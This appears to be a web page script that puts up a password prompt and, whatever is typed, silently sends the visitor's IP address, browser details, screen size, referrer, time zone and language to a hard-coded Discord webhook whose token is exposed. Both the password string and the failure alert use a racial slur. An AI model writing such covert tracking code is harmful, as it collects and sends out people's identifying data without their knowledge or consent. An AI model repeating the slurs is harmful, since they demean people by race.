const webhookURL = "https://discord.com/api/webhooks/1353654454141849640/aCroGe7HbsP6HW3WNl6fXolsqCq0pEoeYd5TSUuGMz-nzZaVbS0CsHKK6sH_VU-CjgQm"; // imagine if you steal the webhook bruh


let userInput = prompt("PASSWORD: ");

if (userInput === "I am not a nigger") {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(ipData => {
            const data = {
                content: `👋 New visitor!
🖥️ Browser: ${navigator.userAgent}
📏 Screen: ${window.screen.width}x${window.screen.height}
🔗 Referrer: ${document.referrer || "Direct Visit"}
🌍 IP Address: ${ipData.ip}
🌎 Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🗣️ Language: ${navigator.language}
They entered the correct password`,
            };

            return fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
            });
        })
        .catch(error => console.error("Error sending message:", error));

} else {

    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(ipData => {
            const data = {
                content: `👋 New visitor!
🖥️ Browser: ${navigator.userAgent}
📏 Screen: ${window.screen.width}x${window.screen.height}
🔗 Referrer: ${document.referrer || "Direct Visit"}
🌍 IP Address: ${ipData.ip}
🌎 Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🗣️ Language: ${navigator.language}
They entered the wrong password`,
            };

            return fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
            });
        })
        .catch(error => console.error("Error sending message:", error));
    alert("Wrong password, your a nigger");
    location.reload();
}